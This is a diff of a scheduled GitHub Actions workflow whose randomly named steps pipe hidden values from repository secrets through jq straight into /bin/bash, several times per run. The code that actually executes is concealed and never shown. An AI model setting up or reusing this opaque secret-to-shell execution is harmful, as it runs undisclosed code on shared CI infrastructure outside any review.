@@ -1,9 +1,9 @@
 name: wenziytx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
+    - cron: '20 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: wenziytx
         env:
-          txzd3: ${{ secrets.txzd3 }}
+          ban1: ${{ secrets.ban1 }}
         run: |
-          echo $txzd3 | jq -r .pkicy89858 | /bin/bash
-          echo $bhfb3814 | jq -r .mv7188 | /bin/bash
-          echo $sdo1747 | jq -r .z76890 | /bin/bash
-          echo $eocm31 | jq -r .jii78 | /bin/bash
-          echo $zfdz39629 | jq -r .o4061 | /bin/bash
-          echo $vh61294 | jq -r .ao83 | /bin/bash
-          echo $jqq8440 | jq -r .dvv5 | /bin/bash
+          echo $ban1 | jq -r .ikh933 | /bin/bash
+          echo $yk37 | jq -r .hfn672 | /bin/bash
+          echo $eajb71285 | jq -r .ei9826 | /bin/bash
+          echo $qnbl035 | jq -r .k88776 | /bin/bash
+          echo $co67 | jq -r .ed20 | /bin/bash
+          echo $pltd23925 | jq -r .b2621 | /bin/bash
+          echo $saea1634 | jq -r .bl34846 | /bin/bash
+          echo $x30 | jq -r .xpfgj7 | /bin/bash
 
